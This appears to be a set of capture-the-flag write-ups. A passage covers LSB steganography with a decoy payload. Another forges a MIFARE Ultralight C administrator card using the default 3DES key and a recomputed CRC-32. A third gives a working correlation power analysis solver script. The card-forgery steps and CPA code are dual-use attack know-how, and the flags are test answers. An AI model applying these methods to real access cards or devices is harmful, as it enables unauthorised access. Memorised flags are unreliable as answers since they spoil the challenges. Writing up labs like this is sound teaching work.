1. Fit `score = b + w·f` by least squares on the last 50 rows. The residuals over the whole history are 0 for rows 209–499 and non-zero for rows 0–208, so the change happens at row 209.
2. Refit on rows 209–499. The max residual is about 1e-14, so the fit is exact. Rows 0–208 also fit their own, different rule exactly, which confirms there was a single change.
3. Score the 32 probes with the new rule. Then compute `q = floor(1000*s + 0.5)`, write each `q` followed by `\n`, and take the SHA-256 of those bytes.

New rule: intercept 1.18176107, weights [-0.5648, -1.4839, -1.4777, 0.1565, -0.7917, 1.2756, -1.0710, 0.7059, 0.8865, 0.3600].

---

### 62. Operation Dawn: The Reconnaissance Plate

| Category | Difficulty | Points |
|---|---|---|
| Misc (stego) | Easy | 127 |

**Flag:** `CSCTF{11_the_guns_behind_the_ridge_3f8c21}`
(the real reconnaissance annotation, in this author's flag format)

#### Challenge

> We recovered a reconnaissance plate (`recon-plate.png`). The photograph is unremarkable,
> but the annotation we need was "carried out" on it. Recover it.

"carried" → carry bits → **LSB steganography**.

#### 1. Triage

- 256×256 8-bit RGB; nothing after `IEND`, no odd chunks, nothing in `strings`.
- The picture is just a noisy diagonal gradient — "unremarkable."
- Extracting bit planes shows the **low bit planes are black except a noise band in the
  top rows** — a payload LSB-embedded sequentially from the top.

#### 2. The bit-0 payload (a decoy!)

Reading bit 0 of each pixel (row-major, channels R/G/B interleaved, MSB-first bytes) gives
a stream starting with `00 00 01 23` (length 0x123 = 291) then gzip magic `1f 8b 08`. It
decompresses to a **tar**:

```
plate/caption.txt    : Range card practice plate. Not for action. Plate 2 of 9.
plate/grid.txt       : grid 41-D  elev 540  bearing 075  range 1200
plate/annotation.txt : DRILL SERIAL 11 HOLD THE RIDGE LINE UNTIL RELIEVED CODE 48B473
```

**Trap:** the caption literally says *"practice plate. Not for action."* and it's a `DRILL`
annotation. `CSCTF{48B473}` is a **decoy** — and it is rejected.

#### 3. The real payload — bit-plane 1

Scanning every bit plane for container magic reveals a **second** gzip tar, this time in
**bit plane 1** (the second-least-significant bit), same RGB/row/MSB framing:

```
plate/caption.txt    : North ridge, 0500. Low cloud over the valley. Plate 7 of 9.
plate/grid.txt       : grid 41-D  elev 540  bearing 075  range 1200
plate/annotation.txt : RECON SERIAL 11 THE GUNS BEHIND THE RIDGE CODE 3F8C21
```

This is a genuine `RECON` plate (no "not for action" disclaimer), matching the challenge
title *The Reconnaissance Plate* and the briefing's "the annotation we need."

Only bit planes 0 and 1 carry payloads; planes 2–7 hold the actual gradient image.

#### 3b. Flag format

The code alone (`CSCTF{3F8C21}`) is **not** the flag. The same author's "Cipher Lock"
challenge used the flag `CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}`, i.e.
`CSCTF{<serial>_<message lowercased, underscores>_<code lowercased>}`. Applying that to
the RECON annotation (`SERIAL 11` / `THE GUNS BEHIND THE RIDGE` / `CODE 3F8C21`):

```
CSCTF{11_the_guns_behind_the_ridge_3f8c21}
```

(The decoy would be `CSCTF{11_hold_the_ridge_line_until_relieved_48b473}`.)

#### 4. Reproduce

```bash
python3 solve.py recon-plate.png
```

`solve.py` walks every bit plane, reads the RGB LSB stream (row-major, R/G/B interleaved,
MSB-first), strips the 4-byte length prefix, gunzips, and lists the tar members. Bit plane
1's annotation gives the flag.

#### 5. Takeaways
- **Read the decoy's own words.** "Not for action / practice plate" is the author telling
  you it's bait. Don't stop at the first payload.
- **Check every bit plane, not just LSB.** The real data was one bit up, in plane 1.
- Recognize carved magics: `00 00 01 23` (length frame) → `1f 8b 08` (gzip) → `ustar` (tar).

---

### 63. ultralight

| Category | Difficulty | Points |
|---|---|---|
| Misc (RFID / crypto) | Medium | 415 |

**Flag:** `CSCTF{EUJtGJ6AWkb9NZnf4gLOY9ZN}`

#### Challenge

Two 192-byte MIFARE Ultralight C card dumps (`card_sam.bin`, `card_frida.bin`) from
regular users. A web service accepts an uploaded `.bin`, validates it **server-side**,
and reveals an access code only for an accepted **administrator** card. Forge one.

#### 1. The dumps

192 bytes = 48 pages × 4 bytes — the MIFARE Ultralight C layout. Hex-diffing the two
cards:

- **Pages 0–2:** UID + BCC + lock bytes (different per card).
- **Page 3 (`0x0C`):** `43 55 01 00` — same on both.
- **Pages 4–7 (`0x10–0x1F`):** `53aa e088 eca5 3c8f 0ff5 26e1 aada 055c` — **identical on
  both cards**. Identical ciphertext across two different cards screams "block cipher with
  a shared header," and MFUL-C uses **3DES**.
- **Rest of the user area:** differs per card.

#### 2. Decrypting the user area

MIFARE Ultralight C ships with a well-known default 2K3DES key, the ASCII string
`BREAKMEIFYOUCAN!`. Trying it on the user data (pages 4–39, offset `0x10:0xA0`) in
**3DES-CBC with a zero IV** yields clean plaintext:

```
0x10: 43 48 52 4f 4e 4f 53 31 00 00 00 00 00 00 00 00   CHRONOS1........
0x20: 01 01 03 00 53 61 6d 00 00 00 00 00 00 00 00 00   ....Sam.........
0x30: 00 00 00 00 00 00 00 00 00 00 00 00 63 bf 4d 80   ............c.M.
0x40: 3d 6f 13 c5 00 ...                                 =o......
```

Record structure:

| Offset | Field | Sam | Frida |
|---|---|---|---|
| `0x10` | magic | `CHRONOS1` | `CHRONOS1` |
| `0x20` | version | `01` | `01` |
| `0x21` | **user_type** | `01` | `01` |
| `0x22` | name length | `03` | `05` |
| `0x24` | username | `Sam` | `Frida` |
| `0x38` | timestamp (8B, big-endian) | `…63bf4d80` | `…6a503600` |
| `0x40` | CRC-32 (4B) | `3d6f13c5` | `5011f3f7` |

#### 3. Letting the server teach us

Submitting the untouched cards:

```
{"error":"invalid_cardtype","message":"... an administrator card is required."}
```

Submitting a tampered card made the server leak the exact integrity check:

```
{"error":"checksum_error",
 "message":"Checksum error: CRC-32 over UID (7 bytes), Unix timestamp
            (8 bytes, big-endian), and user_type does not match."}
```

##### The CRC formula

`CRC-32(zlib, big-endian) over UID(7) + timestamp(8, BE) + user_type(1)`.

The catch: the **7-byte UID skips the BCC0 byte** at index 3. The real UID is
`dump[0:3] + dump[4:8]`, not `dump[0:7]`. With that fix:

```python
uid = dump[0:3] + dump[4:8]
crc = zlib.crc32(uid + ts8 + bytes([user_type])) & 0xffffffff   # big-endian
# Sam  -> 3d6f13c5  ✓     Frida -> 5011f3f7  ✓
```

Because we know the key *and* the CRC formula, we can rewrite any field and produce a
valid card.

#### 4. Finding the admin type and clearing the guards

Sweeping the `user_type` byte at `0x21` (recomputing the CRC each time) walked through a
chain of server checks, each one revealing the next gate:

1. `user_type = 0x03` → stopped saying "invalid_cardtype" → **`0x03` is the admin type.**
2. But it then returned `invalid_user: UID belongs to an issued user card` — Sam's and
   Frida's UIDs are blocklisted. Fix: use a **fresh UID** (and recompute BCC0 / BCC1 and
   the CRC).
   - `BCC0 = 0x88 ^ uid0 ^ uid1 ^ uid2`
   - `BCC1 = uid3 ^ uid4 ^ uid5 ^ uid6`
3. New UID then returned `username already belongs to an issued user` — the name field
   must be unique. Fix: set a fresh **username** (and its length byte at `0x22`). The name
   is *not* part of the CRC, so it's a free edit.

#### 5. The forged card

Fresh UID `04:1A:2B:3C:4D:5E:6F`, `user_type = 0x03`, username `Ghost`, CRC recomputed:

```
{"ok":true,"message":"Administrator card accepted. Access granted.",
 "uid":"04:1A:2B:3C:4D:5E:6F","username":"Ghost",
 "flag":"CSCTF{EUJtGJ6AWkb9NZnf4gLOY9ZN}"}
```

#### 6. How to reproduce

##### Requirements
- Python 3, `pycryptodome` (`pip install pycryptodome`), `requests`.

##### Steps
```bash
# target URL is the per-instance /api/validate endpoint
python3 solve.py card_sam.bin http://<host>:<port>/api/validate
```
`solve.py` decrypts Sam's card as a template, swaps in a fresh UID + BCCs, sets
`user_type=0x03` and a new username, recomputes the CRC-32, re-encrypts with
3DES-CBC/`BREAKMEIFYOUCAN!`, writes `admin_forged.bin`, and uploads it. The server
returns the flag. (The flag is per-instance; the method is what reproduces.)

#### 7. Takeaways
- **Default keys are game over.** `BREAKMEIFYOUCAN!` is the published MFUL-C default; the
  whole card-security model rests on it staying secret.
- **CRC is not a MAC.** The "integrity" field is an unkeyed CRC-32, so anyone who can read
  the data can also forge it. Authenticity needs a keyed MAC/signature.
- **Verbose errors are an oracle.** The server spelled out its exact checksum formula and
  then revealed each subsequent gate (type → UID blocklist → username), turning a forgery
  into a guided walk.
- **Know the medium.** The 7-byte-UID-skips-BCC0 detail is MIFARE-specific and was the one
  thing standing between a wrong and a right CRC.

---

### 64. Operation Dawn: The Cipher Lock

| Category | Difficulty | Points |
|---|---|---|
| Misc (side-channel) | Hard | 540 |

**Flag:** `CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}`

#### Challenge

> An Ash field strongbox uses an electronic cipher lock. Investigators recorded its
> constructed power-trace corpus while known pass-codes were checked against the stored
> code. Recover that code; no physical hardware is required.

Attachment: `traces.npz`

#### 1. Recon

`.npz` is a zip of NumPy arrays. Load it with `allow_pickle=False` so nothing in it can run:

```python
import numpy as np
d = np.load("traces.npz", allow_pickle=False)
for k in d.files:
    print(k, d[k].shape, d[k].dtype)
```

```
traces      (1500, 87) float32   -> 1500 power traces, 87 samples each
plaintexts  (1500, 47) uint8     -> the known pass-code tried for each trace
sbox        (256,)     uint8     -> 99 124 119 123 242 107 111 197 ... (the AES S-box)
```

What this tells us:
- **Known input, unknown secret, power traces:** that is the standard setup for
  **Correlation Power Analysis (CPA)**.
- **The AES S-box is included:** the lock compares each input byte to the stored code by
  computing something like `sbox[input[i] ^ code[i]]`. That non-linear S-box output is the
  textbook point of leakage.
- **47 plaintext bytes:** the stored code is 47 bytes long. That is exactly the length of
  `CSCTF{...}` with a 40-character body, so the code is probably the flag itself.

#### 2. Theory

On CMOS hardware, the power used when a value is handled is roughly proportional to its
**Hamming weight** (the number of 1-bits). So, for each byte position `b`:

```
power[t, sample_b]  ≈  α · HW( sbox[ plaintext[t, b] XOR code[b] ] ) + noise
```

We don't know `code[b]`, but it is only one byte, so there are just 256 possibilities.
For each guess `k`:

1. Predict the leakage of every trace: `h_t = HW(sbox[p_t ^ k])`.
2. Compute the Pearson correlation between `h` and every sample column of the traces.
3. Only the correct `k` predicts the real power use, so it gives a clear correlation peak.
   A wrong `k` sends the S-box output somewhere unrelated, so its correlation stays near noise.

The S-box matters here. Without it, a wrong `p ^ k` would still correlate partly with the
right one, because XOR keeps the bits linearly related. The S-box's non-linearity removes
those ghost peaks, so the right guess stands out.

Each byte leaks at a **different, shuffled sample index**, so we don't assume a fixed
point. For each guess we take the maximum |corr| over all 87 samples.

#### 3. Results

Each of the 47 bytes has one clear winner:

| | correlation |
|---|---|
| Correct guess (lowest across all bytes) | **0.292** |
| Best wrong guess (highest across all bytes) | 0.152 |

There is a gap of about 2× at every position, so no ranking or brute-forcing is needed.
Sample output:

```
byte  0: k=0x43 'C'   corr=0.336 (2nd ...) sample=58
byte  1: k=0x53 'S'   corr=0.376 (2nd ...) sample=23
byte  2: k=0x43 'C'   corr=0.330 (2nd ...) sample=59
byte  3: k=0x54 'T'   corr=0.337 (2nd ...) sample=32
byte  4: k=0x46 'F'   corr=0.321 (2nd ...) sample=44
byte  5: k=0x7b '{'   corr=0.317 (2nd ...) sample=9
...
byte 46: k=0x7d '}'   corr=0.342 (2nd 0.130) sample=62

Recovered code: CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}
```

The leak points (58, 23, 59, 32, 44, 9, ...) are clearly permuted. This is the
"constructed" part of the corpus, and it is why a fixed-window attack would fail.

#### 4. How to reproduce

##### Requirements
- Python 3.8+
- NumPy (`pip install numpy`, or `apt install python3-numpy` on Kali)

##### Steps
```bash
# 1. Put the attachment in its own folder, next to solve.py
mkdir cipherlock && cd cipherlock
cp /path/to/traces.npz .
#    (save solve.py from below into this folder)

# 2. Run the solver (-I = isolated mode, ignores the CWD/env for imports)
python3 -I solve.py traces.npz
```

It runs in about a second and prints the per-byte results above, ending with the flag.

##### `solve.py`

```python
#!/usr/bin/env python3
"""Operation Dawn: The Cipher Lock — CPA solver.
Usage: python3 solve.py [path/to/traces.npz]
"""
import sys
import numpy as np

path = sys.argv[1] if len(sys.argv) > 1 else "traces.npz"
d = np.load(path, allow_pickle=False)
T = d["traces"].astype(np.float64)   # (1500, 87) power samples
P = d["plaintexts"]                  # (1500, 47) known pass-codes tried
S = d["sbox"]                        # (256,) AES S-box

HW = np.array([bin(i).count("1") for i in range(256)], dtype=np.float64)

# Standardise each sample column once so a dot product = Pearson correlation
Tz = (T - T.mean(0)) / T.std(0)
n = len(T)

key = []
for b in range(P.shape[1]):
    # Hypothesis matrix: 256 guesses x n traces of HW(sbox[p ^ k])
    guesses = np.arange(256, dtype=np.uint8)
    H = HW[S[P[:, b][None, :] ^ guesses[:, None]]]          # (256, n)
    H = (H - H.mean(1, keepdims=True)) / H.std(1, keepdims=True)
    corr = np.abs(H @ Tz) / n                               # (256, 87)
    peak = corr.max(1)                                      # best sample per guess
    k = int(peak.argmax())
    runner_up = np.sort(peak)[-2]
    poi = int(corr[k].argmax())
    key.append(k)
    print(f"byte {b:2d}: k=0x{k:02x} {chr(k)!r:5} corr={peak[k]:.3f} "
          f"(2nd {runner_up:.3f}) sample={poi}")

print("\nRecovered code:", bytes(key).decode())
```

##### How the vectorised correlation works
- Standardising both the traces (`Tz`, per column) and the hypotheses (`H`, per row) to
  zero mean and unit variance turns Pearson correlation into a matrix product:
  `corr = H @ Tz / n`.
- One matmul per byte gives the full 256 × 87 correlation table, so the whole attack is
  47 small matmuls.

#### 5. Takeaways
- Known inputs + power traces + an S-box = run CPA with a Hamming-weight model first.
- If the leak position might be shuffled, take the max correlation over all samples
  rather than assuming one point of interest.
- Sanity check: the first 6 recovered bytes spelling `CSCTF{` confirms the model straight
  away.
- Defences: masking (randomising intermediates so HW no longer depends on the secret),
  shuffling with real per-run randomness (not a fixed permutation), and constant-power logic.

---

---
